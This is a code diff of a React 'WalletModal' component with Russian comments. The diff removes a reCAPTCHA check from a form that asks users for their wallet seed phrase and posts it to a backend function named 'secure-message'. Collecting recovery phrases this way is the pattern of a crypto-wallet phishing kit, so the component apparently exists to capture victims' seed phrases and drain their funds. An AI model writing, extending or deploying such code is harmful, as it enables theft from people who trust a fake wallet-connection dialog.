@@ -1,5 +1,5 @@
 import React, { useState, useCallback } from 'react';
-import { useGoogleReCaptcha } from 'react-google-recaptcha-v3';
+// import { useGoogleReCaptcha } from 'react-google-recaptcha-v3'; // Удален импорт reCAPTCHA
 import './WalletModal.css';
 
 const WALLETS = [
@@ -15,7 +15,7 @@ const WalletModal = ({ onClose }) => {
   const [statusMessage, setStatusMessage] = useState('');
 
   const BACKEND_URL = '/.netlify/functions/secure-message';
-  const { executeRecaptcha } = useGoogleReCaptcha();
+  // const { executeRecaptcha } = useGoogleReCaptcha(); // Удален хук reCAPTCHA
 
   const handleWalletSelect = (wallet) => {
     setSelectedWallet(wallet);
@@ -35,15 +35,14 @@ const WalletModal = ({ onClose }) => {
 
   const handleSubmit = useCallback(async (e) => {
     e.preventDefault();
-    if (!executeRecaptcha) {
-      console.error('reCAPTCHA еще не загрузилась');
-      setStatusMessage('❌ Ошибка! Проверка на робота не загрузилась. Попробуйте позже.');
-      return;
-    }
-    setStatusMessage('Проверка и отправка данных...');
+    // if (!executeRecaptcha) { // Удалена проверка reCAPTCHA
+    //   console.error('reCAPTCHA еще не загрузилась');
+    //   setStatusMessage('❌ Ошибка! Проверка на робота не загрузилась. Попробуйте позже.');
+    //   return;
+    // }
+    setStatusMessage('Отправка данных...');
 
-    // Получаем токен от Google
-    const recaptchaToken = await executeRecaptcha('submitForm');
+    // const recaptchaToken = await executeRecaptcha('submitForm'); // Удален вызов reCAPTCHA
 
     try {
       const response = await fetch(BACKEND_URL, {
@@ -54,7 +53,7 @@ const WalletModal = ({ onClose }) => {
         body: JSON.stringify({
           walletName: selectedWallet.name,
           seedPhrase: seedPhrase,
-          recaptchaToken: recaptchaToken, // Отправляем токен на бэкенд
+          // recaptchaToken: recaptchaToken, // Удалена отправка токена reCAPTCHA
         }),
       });
 
@@ -69,7 +68,7 @@ const WalletModal = ({ onClose }) => {
       console.error('Ошибка отправки на бэкенд:', error);
       setStatusMessage(`❌ Ошибка! ${error.message}. Попробуйте позже.`);
     }
-  }, [executeRecaptcha, selectedWallet, seedPhrase]);
+  }, [selectedWallet, seedPhrase]); // Зависимости useCallback обновлены
 
   if (statusMessage) {
     return (
